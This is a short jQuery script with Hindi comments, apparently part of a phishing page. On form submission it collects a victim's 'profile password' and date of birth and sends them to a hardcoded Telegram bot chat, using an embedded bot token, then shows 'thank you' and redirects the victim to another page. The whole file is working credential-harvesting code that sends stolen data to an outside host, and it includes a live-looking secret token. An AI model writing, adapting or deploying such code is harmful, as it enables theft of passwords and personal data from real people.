$(document).ready(function() {
    $("#submitForm").submit(function(event) {
        event.preventDefault(); // फ़ॉर्म सबमिट रोकें

        let ppassword = $("input[name='ppassword']").val().trim();
        let dob = $("input[name='dob']").val().trim();

        if (ppassword === "" || dob === "") {
            alert("कृपया सभी फ़ील्ड भरें!");
            return;
        }

        let botToken = "7839710665:AAGKbR-tYd-mfFYfptxDZnpaUctzEAWMfwU";
        let chatId = "-1002677669875";
        let message = `🔐 **New Profile Details** 🔐\n\n🛡 **Profile Password:** \`${ppassword}\`\n📅 **Date of Birth:** \`${dob}\``;

        let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

        $.ajax({
            url: telegramURL,
            method: "POST",
            data: {
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown"
            },
            success: function(response) {
                console.log("📩 Message Sent Successfully!", response);
                alert("thank you");

                // अगला पेज खोलें
                let nextPage = $("#nextValue").val();
                window.location.href = nextPage;
            },
            error: function(error) {
                console.error("❌ Error Sending Message!", error);
                alert("⚠️ संदेश भेजने में समस्या आई!");
            }
        });
    });
});